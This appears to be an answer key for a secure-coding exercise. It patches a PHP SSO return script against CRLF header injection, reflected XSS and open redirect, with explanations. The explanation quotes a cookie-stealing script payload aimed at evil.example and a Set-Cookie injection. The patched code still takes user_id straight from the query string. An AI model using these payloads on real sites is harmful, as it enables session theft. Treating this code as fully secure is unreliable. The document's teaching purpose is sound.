## Reference solution

```php
// ------------------------------------------------------------------------
// ANSWER — Reflected Input in Location Header
// ------------------------------------------------------------------------

<?php
// auth/sso_return.php

session_start();

if (empty($_SESSION['sso_state']) || $_GET['state'] !== $_SESSION['sso_state']) {
    http_response_code(400);
    exit('Invalid SSO state');
}

unset($_SESSION['sso_state']);
$_SESSION['user_id'] = (int) $_GET['user_id'];

$return_to = $_GET['return_to'] ?? '/dashboard';

// CHANGE 3: Reject any return_to that is not a same-origin relative path, preventing open redirect to external hosts.
if (!preg_match('#^/#', $return_to) || preg_match('#^//|[\r\n]#', $return_to)) {
    $return_to = '/dashboard';
}

// CHANGE 1: Strip CR and LF characters from the redirect target before passing it to header(), neutralising CRLF header injection even on PHP versions that do not block it automatically.
$safe_redirect = str_replace(["\r", "\n"], '', $return_to);

header('Location: ' . $safe_redirect);

// CHANGE 2: HTML-encode the URL before embedding it in the meta tag to prevent XSS through attribute breakout using characters like '"' or '>'.
echo '<meta http-equiv="refresh" content="0;url=' . htmlspecialchars($safe_redirect, ENT_QUOTES, 'UTF-8') . '">';
exit;
```

## Explanation

### Issue 1: CRLF Injection into `Location` Header

**Problem:** An attacker crafts a `return_to` value containing `%0d%0a` (URL-encoded CRLF). When `header('Location: ' . $return_to)` runs, the newline sequence ends the `Location` header and starts a new one — for example, `Set-Cookie: session=attacker_value`. Victims who click the crafted SSO link receive a response that sets an attacker-controlled cookie, enabling session fixation or hijacking.

**Fix:** `str_replace(["\r", "\n"], '', $return_to)` at the CHANGE 1 site removes all carriage-return and line-feed characters from the value before it is passed to `header()`.

**Explanation:** HTTP headers are delimited by CRLF (`\r\n`). When `header()` receives a string containing those bytes, it emits them verbatim into the response on PHP SAPI configurations that do not strip newlines (e.g., certain CGI or FPM setups, or older patch levels). Removing the newline bytes before the call makes it impossible to terminate the intended header and start an injected one. The same sanitised variable `$safe_redirect` is then reused for the meta tag, so both outputs benefit from the strip. One related pitfall: double-URL-encoded sequences like `%250d%250a` would survive a URL-decode step, so stripping the literal byte values — after PHP has already decoded the query string — is the correct layer to apply the fix.

---

### Issue 2: Reflected XSS in `meta` Refresh Tag

**Problem:** The raw `$return_to` string is concatenated directly into an HTML attribute: `content="0;url=<value>"`. An attacker sets `return_to` to `"><script>document.location='https://evil.example/?c='+document.cookie</script>` and the server echoes a page that executes their JavaScript in the victim's browser, giving them the session cookie.

**Fix:** Replace the direct concatenation with `htmlspecialchars($safe_redirect, ENT_QUOTES, 'UTF-8')` at the CHANGE 2 site. This encodes `"`, `'`, `<`, `>`, and `&` into their HTML entities before they land in the attribute value.

**Explanation:** HTML attribute injection works because a double-quote character in the injected value terminates the `content` attribute, and the remaining text is parsed as new HTML. `htmlspecialchars` with `ENT_QUOTES` converts both single and double quotes, so neither quoting style can be used to escape the attribute boundary. Using `UTF-8` as the charset argument prevents multi-byte encoding tricks where certain byte sequences could smuggle a `<` or `>` through. Note that `htmlspecialchars` is applied after the CRLF strip, so `$safe_redirect` feeds both protections in sequence.

---

### Issue 3: Open Redirect to External URLs

**Problem:** Because `return_to` is never validated against the application's own origin, an attacker sends a link like `sso_return.php?state=valid&return_to=https://phishing.example/login`. After the SSO completes, the legitimate server responds with `Location: https://phishing.example/login`. Victims trust the initial URL because it belongs to the real site, and they are then silently forwarded to a fake login page.

**Fix:** The `preg_match` block at the CHANGE 3 site rejects any value that does not start with a single `/`, or that starts with `//` (protocol-relative URL, which is also external). Rejected values fall back to `/dashboard`.

**Explanation:** A URL starting with a single `/` is always relative to the current host; the browser will never send the request to a different origin. Protocol-relative URLs like `//evil.example/` look like paths at a glance but are treated as fully-qualified by browsers, so the `^//` check in the regex blocks them. The same regex also catches embedded CRLF sequences (`[\r\n]`) as a belt-and-suspenders guard, so even if the CHANGE 1 strip were removed, this check would still reject tainted input before it reaches `header()`. One edge case to watch: this validation must run before the CRLF strip so that a value like `\r\nhttps://evil.example` is also rejected on the shape check rather than quietly sanitised into a valid-looking path.
